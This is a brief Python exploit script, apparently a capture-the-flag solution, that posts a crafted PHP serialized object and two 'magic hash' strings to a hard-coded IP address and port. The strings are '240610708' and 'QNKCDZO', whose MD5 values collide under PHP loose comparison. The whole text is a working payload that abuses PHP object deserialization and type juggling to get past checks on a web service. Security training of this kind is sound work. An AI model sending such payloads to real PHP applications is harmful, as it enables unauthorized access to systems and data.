import requests

# 序列化对象
serialized = 'O:1:"A":2:{s:2:"n1";i:0;s:2:"n2";i:0;}'

# 找到两个不同的字符串，它们的MD5哈希值相等
ez1 = "240610708"
ez2 = "QNKCDZO"

# 构造POST数据
data = {"object": serialized, "ez1": ez1, "ez2": ez2, "post": "2333"}

# 构造GET参数
params = {"get": "114514"}

# 发送POST请求
response = requests.post("http://124.16.75.162:31045/", data=data, params=params)

# 打印响应
print(response.text)
